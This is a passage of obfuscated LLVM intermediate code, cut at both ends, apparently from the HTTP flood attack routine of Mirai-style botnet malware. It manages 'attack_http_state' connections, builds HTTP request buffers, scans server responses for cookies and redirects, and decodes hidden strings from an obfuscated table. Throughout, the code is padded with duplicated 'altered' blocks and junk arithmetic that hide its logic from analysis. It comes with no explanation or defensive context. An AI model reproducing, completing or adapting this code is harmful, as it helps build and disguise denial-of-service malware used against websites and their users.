  %4061 = getelementptr inbounds [257 x i8], [257 x i8]* %4060, i32 0, i32 0
  %4062 = getelementptr inbounds i8, i8* %4061, i64 1
  %4063 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4064 = load i32, i32* %9, align 4
  %4065 = sext i32 %4064 to i64
  %4066 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4063, i64 %4065
  %4067 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4066, i32 0, i32 6
  %4068 = getelementptr inbounds [257 x i8], [257 x i8]* %4067, i32 0, i32 0
  %4069 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4070 = load i32, i32* %9, align 4
  %4071 = sext i32 %4070 to i64
  %4072 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4069, i64 %4071
  %4073 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4072, i32 0, i32 6
  %4074 = getelementptr inbounds [257 x i8], [257 x i8]* %4073, i32 0, i32 0
  %4075 = call i32 @util_strlen(i8* %4074)
  %4076 = sext i32 %4075 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %4062, i8* %4068, i64 %4076, i32 1, i1 false)
  %4077 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4078 = load i32, i32* %9, align 4
  %4079 = sext i32 %4078 to i64
  %4080 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4077, i64 %4079
  %4081 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4080, i32 0, i32 6
  %4082 = getelementptr inbounds [257 x i8], [257 x i8]* %4081, i64 0, i64 0
  store i8 47, i8* %4082, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %323
  %4083 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %4084 = load i32, i32* %9, align 4
  %4085 = load i8, i8* %5, align 1
  %4086 = zext i8 %4085 to i32
  %_15 = shl i32 %4084, %4086
  %_16 = sub i32 %4084, %4086
  %gen17 = mul i32 %_16, %4086
  %4087 = srem i32 %4084, %4086
  %4088 = sext i32 %4087 to i64
  %4089 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4083, i64 %4088
  %4090 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4089, i32 0, i32 1
  %4091 = load i32, i32* %4090, align 4
  %4092 = call i32 @ntohl(i32 %4091) #7
  %4093 = call i32 @rand_next()
  %4094 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %4095 = load i32, i32* %9, align 4
  %4096 = load i8, i8* %5, align 1
  %4097 = zext i8 %4096 to i32
  %_18 = shl i32 %4095, %4097
  %_19 = sub i32 %4095, %4097
  %gen20 = mul i32 %_19, %4097
  %_21 = sub i32 %4095, %4097
  %gen22 = mul i32 %_21, %4097
  %_23 = shl i32 %4095, %4097
  %4098 = srem i32 %4095, %4097
  %4099 = sext i32 %4098 to i64
  %4100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4094, i64 %4099
  %4101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4100, i32 0, i32 2
  %4102 = load i8, i8* %4101, align 4
  %4103 = zext i8 %4102 to i32
  %_24 = sub i32 %4093, %4103
  %gen25 = mul i32 %_24, %4103
  %_26 = sub i32 %4093, %4103
  %gen27 = mul i32 %_26, %4103
  %_28 = shl i32 %4093, %4103
  %4104 = lshr i32 %4093, %4103
  %_29 = sub i32 0, %4092
  %gen30 = add i32 %_29, %4104
  %_31 = sub i32 %4092, %4104
  %gen32 = mul i32 %_31, %4104
  %_33 = shl i32 %4092, %4104
  %_34 = shl i32 %4092, %4104
  %_35 = sub i32 0, %4092
  %gen36 = add i32 %_35, %4104
  %_37 = shl i32 %4092, %4104
  %4105 = add i32 %4092, %4104
  %4106 = call i32 @htonl(i32 %4105) #7
  %4107 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4108 = load i32, i32* %9, align 4
  %4109 = sext i32 %4108 to i64
  %4110 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4107, i64 %4109
  %4111 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4110, i32 0, i32 4
  store i32 %4106, i32* %4111, align 4
  br label %originalBB14

originalBB41alteredBB:                            ; preds = %originalBB41, %381
  call void @table_unlock_val(i8 zeroext 55)
  %4112 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4113 = load i32, i32* %9, align 4
  %4114 = sext i32 %4113 to i64
  %4115 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4112, i64 %4114
  %4116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4115, i32 0, i32 5
  %4117 = getelementptr inbounds [512 x i8], [512 x i8]* %4116, i32 0, i32 0
  %4118 = call i8* @table_retrieve_val(i32 55, i32* null)
  %4119 = call i32 @util_strcpy(i8* %4117, i8* %4118)
  call void @table_lock_val(i8 zeroext 55)
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %415
  call void @table_unlock_val(i8 zeroext 57)
  %4120 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4121 = load i32, i32* %9, align 4
  %4122 = sext i32 %4121 to i64
  %4123 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4120, i64 %4122
  %4124 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4123, i32 0, i32 5
  %4125 = getelementptr inbounds [512 x i8], [512 x i8]* %4124, i32 0, i32 0
  %4126 = call i8* @table_retrieve_val(i32 57, i32* null)
  %4127 = call i32 @util_strcpy(i8* %4125, i8* %4126)
  call void @table_lock_val(i8 zeroext 57)
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %489
  %4128 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4129 = load i32, i32* %9, align 4
  %4130 = sext i32 %4129 to i64
  %4131 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4128, i64 %4130
  store %struct.attack_http_state* %4131, %struct.attack_http_state** %26, align 8
  %4132 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4132, i32 0, i32 1
  %4134 = load i8, i8* %4133, align 4
  %4135 = zext i8 %4134 to i32
  %4136 = icmp eq i32 %4135, 1
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %523
  %4137 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4138 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4137, i32 0, i32 1
  store i8 0, i8* %4138, align 4
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %543
  %4139 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4140 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4139, i32 0, i32 1
  %4141 = load i8, i8* %4140, align 4
  %4142 = zext i8 %4141 to i32
  %4143 = icmp eq i32 %4142, 0
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %871
  %4144 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4145 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4146 = call i32 @util_strlen(i8* %4145)
  %4147 = sext i32 %4146 to i64
  %4148 = getelementptr inbounds i8, i8* %4144, i64 %4147
  %4149 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4150 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4149, i32 0, i32 16
  %4151 = load i32, i32* %10, align 4
  %4152 = sext i32 %4151 to i64
  %4153 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4150, i64 0, i64 %4152
  %4154 = getelementptr inbounds [128 x i8], [128 x i8]* %4153, i32 0, i32 0
  %4155 = call i32 @util_strcpy(i8* %4148, i8* %4154)
  %4156 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4157 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4158 = call i32 @util_strlen(i8* %4157)
  %4159 = sext i32 %4158 to i64
  %4160 = getelementptr inbounds i8, i8* %4156, i64 %4159
  %4161 = call i32 @util_strcpy(i8* %4160, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %916
  %4162 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4163 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4164 = call i32 @util_strlen(i8* %4163)
  %4165 = sext i32 %4164 to i64
  %4166 = getelementptr inbounds i8, i8* %4162, i64 %4165
  %4167 = call i32 @util_strcpy(i8* %4166, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %4168 = load i8*, i8** %14, align 8
  %4169 = icmp ne i8* %4168, null
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %941
  %4170 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4171 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4172 = call i32 @util_strlen(i8* %4171)
  %4173 = sext i32 %4172 to i64
  %4174 = getelementptr inbounds i8, i8* %4170, i64 %4173
  %4175 = load i8*, i8** %14, align 8
  %4176 = call i32 @util_strcpy(i8* %4174, i8* %4175)
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %1016
  %4177 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4178 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4177, i32 0, i32 0
  %4179 = load i32, i32* %4178, align 4
  %_74 = sub i32 0, %4179
  %gen75 = add i32 %_74, 1
  %_76 = shl i32 %4179, 1
  %4180 = add nsw i32 %4179, 1
  store i32 %4180, i32* %23, align 4
  br label %originalBB73

originalBB80alteredBB:                            ; preds = %originalBB80, %1103
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %1120
  %4181 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4181, i32 0, i32 1
  %4183 = load i8, i8* %4182, align 4
  %4184 = zext i8 %4183 to i32
  %4185 = icmp eq i32 %4184, 10
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %1184
  %4186 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4186, i32 0, i32 1
  store i8 0, i8* %4187, align 4
  %4188 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4188, i32 0, i32 0
  %4190 = load i32, i32* %4189, align 4
  %4191 = call i32 @close(i32 %4190)
  %4192 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4193 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4192, i32 0, i32 0
  store i32 -1, i32* %4193, align 4
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %1210
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %1227
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %1245
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %1262
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %1279
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %1299
  %4194 = load i32, i32* %23, align 4
  %4195 = icmp eq i32 %4194, 0
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %1318
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %1335
  %4196 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %4196, align 8
  %4197 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %4197, align 8
  %4198 = load i32, i32* %23, align 4
  %4199 = call i32 @select(i32 %4198, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %4199, i32* %24, align 4
  %4200 = call i64 @time(i64* null) #6
  %4201 = trunc i64 %4200 to i32
  store i32 %4201, i32* %27, align 4
  %4202 = load i32, i32* %24, align 4
  %4203 = icmp slt i32 %4202, 1
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %1360
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %1377
  store i32 0, i32* %9, align 4
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %1398
  %4204 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4205 = load i32, i32* %9, align 4
  %4206 = sext i32 %4205 to i64
  %4207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4204, i64 %4206
  store %struct.attack_http_state* %4207, %struct.attack_http_state** %26, align 8
  %4208 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4209 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4208, i32 0, i32 0
  %4210 = load i32, i32* %4209, align 4
  %4211 = icmp eq i32 %4210, -1
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %1441
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %4212 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4212, i32 0, i32 0
  %4214 = load i32, i32* %4213, align 4
  %4215 = bitcast i32* %35 to i8*
  %4216 = call i32 @getsockopt(i32 %4214, i32 1, i32 4, i8* %4215, i32* %36) #6
  store i32 %4216, i32* %12, align 4
  %4217 = load i32, i32* %35, align 4
  %4218 = icmp eq i32 %4217, 0
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %1480
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %1497
  %4219 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %4220 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4220, i32 0, i32 0
  %4222 = load i32, i32* %4221, align 4
  %_145 = sub i32 %4222, 64
  %gen146 = mul i32 %_145, 64
  %_147 = sub i32 0, %4222
  %gen148 = add i32 %_147, 64
  %_149 = sub i32 0, %4222
  %gen150 = add i32 %_149, 64
  %_151 = shl i32 %4222, 64
  %_152 = sub i32 %4222, 64
  %gen153 = mul i32 %_152, 64
  %_154 = sub i32 0, %4222
  %gen155 = add i32 %_154, 64
  %4223 = sdiv i32 %4222, 64
  %4224 = sext i32 %4223 to i64
  %4225 = getelementptr inbounds [16 x i64], [16 x i64]* %4219, i64 0, i64 %4224
  %4226 = load i64, i64* %4225, align 8
  %4227 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4228 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4227, i32 0, i32 0
  %4229 = load i32, i32* %4228, align 4
  %_156 = shl i32 %4229, 64
  %_157 = sub i32 %4229, 64
  %gen158 = mul i32 %_157, 64
  %_159 = sub i32 0, %4229
  %gen160 = add i32 %_159, 64
  %4230 = srem i32 %4229, 64
  %4231 = zext i32 %4230 to i64
  %_161 = sub i64 1, %4231
  %gen162 = mul i64 %_161, %4231
  %_163 = sub i64 0, 1
  %gen164 = add i64 %_163, %4231
  %_165 = sub i64 1, %4231
  %gen166 = mul i64 %_165, %4231
  %_167 = sub i64 1, %4231
  %gen168 = mul i64 %_167, %4231
  %_169 = shl i64 1, %4231
  %4232 = shl i64 1, %4231
  %_170 = sub i64 0, %4226
  %gen171 = add i64 %_170, %4232
  %4233 = and i64 %4226, %4232
  %4234 = icmp ne i64 %4233, 0
  br label %originalBB144

originalBB175alteredBB:                           ; preds = %originalBB175, %1545
  %4235 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4235, i32 0, i32 0
  %4237 = load i32, i32* %4236, align 4
  %4238 = call i32 @close(i32 %4237)
  %4239 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4240 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4239, i32 0, i32 0
  store i32 -1, i32* %4240, align 4
  %4241 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4242 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4241, i32 0, i32 1
  store i8 0, i8* %4242, align 4
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %1570
  %4243 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4244 = load i32, i32* %12, align 4
  %4245 = call i32 @util_memsearch(i8* %4243, i32 %4244, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %4246 = icmp eq i32 %4245, -1
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %1595
  %4247 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4248 = load i32, i32* %12, align 4
  %4249 = call i32 @util_memsearch(i8* %4247, i32 %4248, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %4250 = sext i32 %4249 to i64
  %4251 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4250
  store i8 0, i8* %4251, align 1
  %4252 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4253 = load i32, i32* %12, align 4
  %4254 = call i8* @table_retrieve_val(i32 53, i32* null)
  %4255 = call i32 @util_stristr(i8* %4252, i32 %4253, i8* %4254)
  %4256 = icmp ne i32 %4255, -1
  br label %originalBB183

originalBB187alteredBB:                           ; preds = %originalBB187, %1634
  %4257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4257, i32 0, i32 12
  store i32 0, i32* %4258, align 4
  %4259 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4260 = load i32, i32* %12, align 4
  %4261 = call i8* @table_retrieve_val(i32 51, i32* null)
  %4262 = call i32 @util_stristr(i8* %4259, i32 %4260, i8* %4261)
  %4263 = icmp ne i32 %4262, -1
  br label %originalBB187

originalBB191alteredBB:                           ; preds = %originalBB191, %1672
  %4264 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4265 = load i32, i32* %38, align 4
  %4266 = sext i32 %4265 to i64
  %4267 = getelementptr inbounds i8, i8* %4264, i64 %4266
  %4268 = load i32, i32* %12, align 4
  %4269 = load i32, i32* %38, align 4
  %_192 = shl i32 %4268, %4269
  %_193 = sub i32 0, %4268
  %gen194 = add i32 %_193, %4269
  %4270 = sub nsw i32 %4268, %4269
  %4271 = call i32 @util_memsearch(i8* %4267, i32 %4270, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4271, i32* %39, align 4
  %4272 = load i32, i32* %39, align 4
  %4273 = icmp ne i32 %4272, -1
  br label %originalBB191

originalBB198alteredBB:                           ; preds = %originalBB198, %1699
  %4274 = load i32, i32* %38, align 4
  %4275 = sext i32 %4274 to i64
  %4276 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4275
  store i8* %4276, i8** %40, align 8
  %4277 = load i32, i32* %39, align 4
  %4278 = icmp sge i32 %4277, 2
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1724
  %4279 = load i32, i32* %38, align 4
  %4280 = load i32, i32* %39, align 4
  %_203 = sub i32 %4279, %4280
  %gen204 = mul i32 %_203, %4280
  %_205 = sub i32 %4279, %4280
  %gen206 = mul i32 %_205, %4280
  %_207 = shl i32 %4279, %4280
  %_208 = sub i32 %4279, %4280
  %gen209 = mul i32 %_208, %4280
  %_210 = shl i32 %4279, %4280
  %4281 = add nsw i32 %4279, %4280
  %4282 = sext i32 %4281 to i64
  %4283 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4282
  store i8 0, i8* %4283, align 1
  %4284 = load i8*, i8** %40, align 8
  %4285 = load i8*, i8** %40, align 8
  %4286 = call i32 @util_strlen(i8* %4285)
  %4287 = call i8* @table_retrieve_val(i32 50, i32* null)
  %4288 = call i32 @util_stristr(i8* %4284, i32 %4286, i8* %4287)
  %4289 = icmp ne i32 %4288, 0
  br label %originalBB202

originalBB214alteredBB:                           ; preds = %originalBB214, %1757
  %4290 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4290, i32 0, i32 13
  store i32 0, i32* %4291, align 4
  %4292 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4293 = load i32, i32* %12, align 4
  %4294 = call i8* @table_retrieve_val(i32 48, i32* null)
  %4295 = call i32 @util_stristr(i8* %4292, i32 %4293, i8* %4294)
  %4296 = icmp ne i32 %4295, -1
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1795
  %4297 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4298 = load i32, i32* %41, align 4
  %4299 = sext i32 %4298 to i64
  %4300 = getelementptr inbounds i8, i8* %4297, i64 %4299
  %4301 = load i32, i32* %12, align 4
  %4302 = load i32, i32* %41, align 4
  %_219 = sub i32 %4301, %4302
  %gen220 = mul i32 %_219, %4302
  %_221 = shl i32 %4301, %4302
  %4303 = sub nsw i32 %4301, %4302
  %4304 = call i32 @util_memsearch(i8* %4300, i32 %4303, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4304, i32* %42, align 4
  %4305 = load i32, i32* %42, align 4
  %4306 = icmp ne i32 %4305, -1
  br label %originalBB218

originalBB225alteredBB:                           ; preds = %originalBB225, %1831
  %4307 = load i32, i32* %41, align 4
  %4308 = load i32, i32* %42, align 4
  %_226 = shl i32 %4307, %4308
  %4309 = add nsw i32 %4307, %4308
  %4310 = sext i32 %4309 to i64
  %4311 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4310
  store i8 0, i8* %4311, align 1
  %4312 = load i8*, i8** %43, align 8
  %4313 = load i8*, i8** %43, align 8
  %4314 = call i32 @util_strlen(i8* %4313)
  %4315 = call i8* @table_retrieve_val(i32 49, i32* null)
  %4316 = call i32 @util_stristr(i8* %4312, i32 %4314, i8* %4315)
  %4317 = icmp ne i32 %4316, 0
  br label %originalBB225

originalBB230alteredBB:                           ; preds = %originalBB230, %1859
  %4318 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4319 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4318, i32 0, i32 13
  store i32 1, i32* %4319, align 4
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1900
  %4320 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4321 = load i32, i32* %44, align 4
  %4322 = sext i32 %4321 to i64
  %4323 = getelementptr inbounds i8, i8* %4320, i64 %4322
  %4324 = load i32, i32* %12, align 4
  %4325 = load i32, i32* %44, align 4
  %_235 = sub i32 0, %4324
  %gen236 = add i32 %_235, %4325
  %_237 = sub i32 %4324, %4325
  %gen238 = mul i32 %_237, %4325
  %_239 = sub i32 0, %4324
  %gen240 = add i32 %_239, %4325
  %_241 = sub i32 %4324, %4325
  %gen242 = mul i32 %_241, %4325
  %4326 = sub nsw i32 %4324, %4325
  %4327 = call i32 @util_memsearch(i8* %4323, i32 %4326, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4327, i32* %45, align 4
  %4328 = load i32, i32* %45, align 4
  %4329 = icmp ne i32 %4328, -1
  br label %originalBB234

originalBB246alteredBB:                           ; preds = %originalBB246, %1950
  store i32 0, i32* %37, align 4
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %2026
  %4330 = load i32, i32* %48, align 4
  %_251 = sub i32 0, %4330
  %gen252 = add i32 %_251, 2
  %_253 = sub i32 0, %4330
  %gen254 = add i32 %_253, 2
  %_255 = sub i32 %4330, 2
  %gen256 = mul i32 %_255, 2
  %_257 = shl i32 %4330, 2
  %_258 = shl i32 %4330, 2
  %_259 = sub i32 %4330, 2
  %gen260 = mul i32 %_259, 2
  %4331 = sub nsw i32 %4330, 2
  store i32 %4331, i32* %48, align 4
  br label %originalBB250

originalBB264alteredBB:                           ; preds = %originalBB264, %2096
  br label %originalBB264

originalBB268alteredBB:                           ; preds = %originalBB268, %2114
  %4332 = load i32, i32* %10, align 4
  %_269 = shl i32 %4332, 1
  %_270 = sub i32 0, %4332
  %gen271 = add i32 %_270, 1
  %_272 = shl i32 %4332, 1
  %_273 = sub i32 0, %4332
  %gen274 = add i32 %_273, 1
  %_275 = sub i32 %4332, 1
  %gen276 = mul i32 %_275, 1
  %_277 = shl i32 %4332, 1
  %4333 = add nsw i32 %4332, 1
  store i32 %4333, i32* %10, align 4
  br label %originalBB268

originalBB281alteredBB:                           ; preds = %originalBB281, %2133
  %4334 = load i8*, i8** %49, align 8
  %4335 = load i32, i32* %10, align 4
  %4336 = sext i32 %4335 to i64
  %4337 = getelementptr inbounds i8, i8* %4334, i64 %4336
  %4338 = load i8, i8* %4337, align 1
  %4339 = sext i8 %4338 to i32
  %4340 = icmp eq i32 %4339, 61
  br label %originalBB281

originalBB285alteredBB:                           ; preds = %originalBB285, %2157
  %4341 = load i32, i32* %10, align 4
  store i32 %4341, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %originalBB285

originalBB289alteredBB:                           ; preds = %originalBB289, %2192
  store i32 1, i32* %51, align 4
  br label %originalBB289

originalBB293alteredBB:                           ; preds = %originalBB293, %2209
  br label %originalBB293

originalBB297alteredBB:                           ; preds = %originalBB297, %2229
  %4342 = load i32, i32* %51, align 4
  %4343 = icmp ne i32 %4342, 0
  br label %originalBB297

originalBB301alteredBB:                           ; preds = %originalBB301, %2267
  br label %originalBB301

originalBB305alteredBB:                           ; preds = %originalBB305, %2307
  %4344 = load i32, i32* %52, align 4
  %_306 = sub i32 %4344, 1
  %gen307 = mul i32 %_306, 1
  %_308 = sub i32 0, %4344
  %gen309 = add i32 %_308, 1
  %4345 = add nsw i32 %4344, 1
  store i32 %4345, i32* %52, align 4
  br label %originalBB305

originalBB313alteredBB:                           ; preds = %originalBB313, %2346
  %4346 = load i32, i32* %52, align 4
  %4347 = load i32, i32* %53, align 4
  %_314 = sub i32 %4346, %4347
  %gen315 = mul i32 %_314, %4347
  %_316 = shl i32 %4346, %4347
  %_317 = sub i32 0, %4346
  %gen318 = add i32 %_317, %4347
  %_319 = sub i32 %4346, %4347
  %gen320 = mul i32 %_319, %4347
  %_321 = sub i32 0, %4346
  %gen322 = add i32 %_321, %4347
  %4348 = add nsw i32 %4346, %4347
  %4349 = sext i32 %4348 to i64
  %4350 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4349
  store i8 0, i8* %4350, align 1
  %4351 = load i32, i32* %53, align 4
  %_323 = shl i32 %4351, 1
  %_324 = shl i32 %4351, 1
  %_325 = sub i32 0, %4351
  %gen326 = add i32 %_325, 1
  %_327 = shl i32 %4351, 1
  %_328 = sub i32 %4351, 1
  %gen329 = mul i32 %_328, 1
  %_330 = sub i32 0, %4351
  %gen331 = add i32 %_330, 1
  %_332 = shl i32 %4351, 1
  %4352 = add nsw i32 %4351, 1
  store i32 %4352, i32* %53, align 4
  %4353 = load i8*, i8** %54, align 8
  %4354 = load i32, i32* %53, align 4
  %4355 = call i32 @util_memsearch(i8* %4353, i32 %4354, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %4356 = icmp eq i32 %4355, 4
  br label %originalBB313

originalBB336alteredBB:                           ; preds = %originalBB336, %2383
  %4357 = load i8*, i8** %54, align 8
  %4358 = load i8*, i8** %54, align 8
  %4359 = load i32, i32* %10, align 4
  %4360 = sext i32 %4359 to i64
  %4361 = getelementptr inbounds i8, i8* %4358, i64 %4360
  %4362 = load i32, i32* %53, align 4
  %4363 = load i32, i32* %10, align 4
  %_337 = shl i32 %4362, %4363
  %_338 = sub i32 %4362, %4363
  %gen339 = mul i32 %_338, %4363
  %_340 = sub i32 %4362, %4363
  %gen341 = mul i32 %_340, %4363
  %_342 = sub i32 %4362, %4363
  %gen343 = mul i32 %_342, %4363
  %_344 = sub i32 %4362, %4363
  %gen345 = mul i32 %_344, %4363
  %_346 = sub i32 %4362, %4363
  %gen347 = mul i32 %_346, %4363
  %_348 = shl i32 %4362, %4363
  %_349 = shl i32 %4362, %4363
  %4364 = sub nsw i32 %4362, %4363
  %4365 = sext i32 %4364 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %4357, i8* %4361, i64 %4365, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %originalBB336

originalBB353alteredBB:                           ; preds = %originalBB353, %2430
  %4366 = load i32, i32* %10, align 4
  %_354 = sub i32 %4366, 1
  %gen355 = mul i32 %_354, 1
  %_356 = sub i32 %4366, 1
